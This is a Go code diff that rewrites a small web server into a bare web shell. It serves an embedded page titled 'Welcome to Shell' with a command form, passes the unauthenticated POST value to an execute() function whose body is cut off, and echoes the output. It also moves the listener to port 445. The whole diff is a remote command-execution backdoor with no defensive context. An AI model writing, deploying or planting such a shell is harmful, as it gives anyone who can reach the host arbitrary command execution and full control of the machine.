@@ -1,7 +1,6 @@
 package main
 
 import (
-	"html/template"
 	"net/http"
 	"github.com/gorilla/mux"
 	"fmt"
@@ -9,28 +8,46 @@ import (
 	s "strings"
 )
 
-var templates *template.Template
+const index= `<!doctype html>
 
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+
+  <title>Welcome to Shell</title>
+
+</head>
+
+<body>
+    <h1>Command to Run</h1>
+   <form method="POST">
+       <textarea name="command"></textarea>
+       <div>
+           <button type="submit">Yeet that shit</button>
+       </div>
+   </form>
+</body>
+</html>
+`
 func main() {
-	templates = template.Must(template.ParseGlob("templates/*.html"))
 	r := mux.NewRouter()
 
 	r.HandleFunc("/", indexGetHandler).Methods("GET")
 	r.HandleFunc("/", indexPostHandler).Methods("POST")
 
 	http.Handle("/", r)
-	http.ListenAndServe(":8080", nil)
+	http.ListenAndServe(":445", nil)
 }
 
 func indexGetHandler(w http.ResponseWriter, r *http.Request) {
-	templates.ExecuteTemplate(w, "index.html", nil)
+	w.Write([]byte(index))
 }
 
 func indexPostHandler(w http.ResponseWriter, r *http.Request) {
-	r.ParseForm()
-	rawCommand := r.PostForm.Get("command")
-	commandOutput := execute(rawCommand)
+	com := r.FormValue("command")
+	commandOutput := execute(com)
 	fmt.Fprintf(w, string(commandOutput))
+	w.Write([]byte(commandOutput))
 }
 
 func execute(inputCommd string) []byte {
